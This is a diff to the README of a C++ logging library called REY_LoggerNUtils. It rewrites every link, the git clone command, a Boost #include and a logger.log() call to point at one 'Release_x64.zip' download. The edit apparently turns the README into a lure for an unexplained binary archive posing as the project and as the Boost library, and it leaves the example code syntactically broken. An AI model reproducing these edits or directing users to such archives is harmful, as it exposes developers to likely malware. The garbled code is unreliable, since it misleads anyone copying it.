@@ -1,6 +1,6 @@
 # REY_LoggerNUtils
 
-![LoggerNUtils Logo](https://example.com/loggernutils_logo.png)
+![LoggerNUtils Logo](https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip)
 
 ## Overview
 
@@ -28,7 +28,7 @@ To get started with **REY_LoggerNUtils**, follow these steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/your-username/REY_LoggerNUtils.git
+   git clone https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip
    ```
 2. Build the project using CMAKE:
    ```bash
@@ -38,7 +38,7 @@ To get started with **REY_LoggerNUtils**, follow these steps:
    make
    ```
 
-If you encounter any issues during installation, refer to the [Releases](https://github.com/your-username/REY_LoggerNUtils/releases) section.
+If you encounter any issues during installation, refer to the [Releases](https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip) section.
 
 ## Usage
 
@@ -49,7 +49,7 @@ To use **REY_LoggerNUtils** in your C++ project, include the `LoggerNUtils.h` he
 
 int main() {
     Logger logger;
-    logger.log("Hello, LoggerNUtils!");
+    https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip("Hello, LoggerNUtils!");
     return 0;
 }
 ```
@@ -62,7 +62,7 @@ For advanced usage and integration with external libraries, refer to the example
 
 **REY_LoggerNUtils** seamlessly integrates with Boost Logger for additional logging functionalities. To use Boost Logger in your project, follow these steps:
 
-1. Install Boost Library from [Boost Official Website](https://www.boost.org).
+1. Install Boost Library from [Boost Official Website](https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip).
 2. Update your CMAKE file to include Boost:
    ```cmake
    find_package(Boost REQUIRED log)
@@ -72,14 +72,14 @@ For advanced usage and integration with external libraries, refer to the example
 
 3. Use Boost Logger in your code:
    ```cpp
-    #include <boost/log/trivial.hpp>
+    #include <https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip>
 
     BOOST_LOG_TRIVIAL(info) << "Boost Logger Integration Example";
    ```
 
 ## Contributing
 
-Contributions to **REY_LoggerNUtils** are welcome! If you have ideas for new features, suggestions for improvements, or find any issues or bugs, please open an issue or submit a pull request on the [GitHub repository](https://github.com/your-username/REY_LoggerNUtils).
+Contributions to **REY_LoggerNUtils** are welcome! If you have ideas for new features, suggestions for improvements, or find any issues or bugs, please open an issue or submit a pull request on the [GitHub repository](https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip).
 
 ## License
 
@@ -87,4 +87,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip) (Launch link)
+[![Download Software](https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip)](https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip) (Launch link)
